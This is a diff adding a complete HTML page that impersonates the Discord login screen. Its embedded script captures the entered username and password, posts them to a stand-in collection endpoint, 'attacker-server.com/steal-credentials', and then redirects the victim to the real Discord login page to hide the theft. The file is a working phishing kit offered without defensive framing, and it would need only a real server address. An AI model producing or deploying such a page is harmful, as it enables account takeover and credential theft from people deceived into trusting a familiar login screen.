@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Login</title>
+</head>
+<body>
+    <h2>Discord Login</h2>
+    <form id="loginForm">
+        <label for="username">Username:</label><br>
+        <input type="text" id="username" name="username"><br><br>
+        <label for="password">Password:</label><br>
+        <input type="password" id="password" name="password"><br><br>
+        <button type="submit">Login</button>
+    </form>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+            sendData(username, password);
+        });
+
+        function sendData(username, password) {
+            var xhr = new XMLHttpRequest();
+            var url = "https://attacker-server.com/steal-credentials";
+            xhr.open("POST", url, true);
+            xhr.setRequestHeader("Content-Type", "application/json");
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    console.log("Credentials sent successfully");
+                    // Optional: Redirect the user to a legitimate Discord login page after stealing credentials
+                    window.location.replace("https://discord.com/login");
+                }
+            };
+            var data = JSON.stringify({ username: username, password: password });
+            xhr.send(data);
+        }
+    </script>
+</body>
+</html>
